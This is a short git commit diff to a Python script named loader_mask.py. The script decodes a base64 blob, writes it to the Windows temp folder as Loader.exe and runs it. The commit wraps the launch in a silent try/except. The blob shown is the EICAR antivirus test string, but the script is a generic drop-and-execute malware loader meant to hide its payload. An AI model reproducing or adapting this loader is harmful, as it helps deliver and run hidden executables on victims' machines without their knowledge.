e26e120c2bb1db619678ff35f21449ed85d5ed66
httpshotmaker <80145620+httpshotmaker@users.noreply.github.com>
2022-08-19 13:22:28 +0300

    Update loader_mask.py

--- loader_mask.py
+++ loader_mask.py
@@ -8,5 +8,8 @@ temp = sbp.check_output("cmd /c echo %temp%").decode().replace("\r\n","")
 b64data = b'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='
 with open(f"{temp}\\Loader.exe","wb")as f:
     f.write(b64d(b64data))
-subprocess.Popen(f"{temp}\\Loader.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
+try:
+    subprocess.Popen(f"{temp}\\Loader.exe", creationflags=subprocess.CREATE_NEW_CONSOLE)
+except:
+    sys.exit()
 sys.exit()
